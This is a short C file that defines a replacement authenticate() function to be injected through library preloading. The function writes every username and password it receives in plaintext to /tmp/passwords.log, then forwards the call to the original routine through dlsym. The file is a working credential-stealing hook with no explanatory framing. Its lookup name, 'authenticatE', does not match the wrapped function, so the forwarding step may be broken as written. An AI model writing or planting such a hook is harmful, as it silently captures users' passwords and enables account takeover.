#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>

int authenticate(char * username, char * password){

    int (* original_authenticate)(char *, char *);
    
    FILE * fd = fopen("/tmp/passwords.log", "a+");
    fprintf(fd, "%s / %s\n", username, password);
    fclose(fd);
    
    original_authenticate = dlsym(RTLD_NEXT, "authenticatE");

    return (* original_authenticate)(username, password);

}